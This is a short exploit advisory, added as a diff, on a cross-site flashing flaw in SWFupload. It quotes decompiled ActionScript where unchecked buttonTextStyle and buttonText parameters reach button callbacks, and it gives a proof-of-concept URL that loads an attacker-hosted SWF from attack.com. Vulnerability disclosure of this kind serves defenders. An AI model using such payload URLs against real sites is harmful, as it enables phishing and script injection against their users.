@@ -1,0 +1,58 @@
+# Exploit Title: SWFupload All Version XSF Vulnerability
+ 
+# Date: 25/01/2014
+ 
+# Exploit Author: MindCracker - Team MaDLeeTs
+ 
+# Contact : MindCrackerKhan@Gmail.com - Maddy@live.com.pk | https://twitter.com/MindCrackerKhan
+ 
+# Verion : All
+
+# Tested on: Linux / Window
+
+#Description :
+
+XSF occurs when an SWF have permission/able to load another file from another directory or site.The vulnerable 
+swf can be exploited by just loading swf/img/any ( like Phishing or Cross-Site scripting
+
+#Vulnerable Code :
+            
+
+ExternalInterface.addCallback("SetButtonTextStyle",this.SetButtonTextStyle);
+
+  this.SetButtonTextStyle(String(root.loaderInfo.parameters.buttonTextStyle));
+         }
+         catch(ex:Object)
+         {
+            this.SetButtonTextStyle("");
+         }
+         try
+         {
+
+As you can see the .buttonTextStyle variable is not well configured ( by exactly adding the value ) and This ButtonTextStyle will accept any value
+The vulneralbe SWF will load any file 
+
+http://victim.com/buttontextstyle.swf?buttonTextStyle=http://attack.com/Exploiting.swf
+
+2.
+
+ExternalInterface.addCallback("SetButtonText",this.SetButtonText);
+SetButtonText
+
+{
+            this.SetButtonText(String(root.loaderInfo.parameters.buttonText));
+         }
+         catch(ex:Object)
+         {
+            this.SetButtonText("");
+         }
+         try
+         {
+
+#POC 
+
+http://victim.com/swfupload.swf?buttonTextStyle=http://attack.com/Exploiting.swf
+
+
+
+
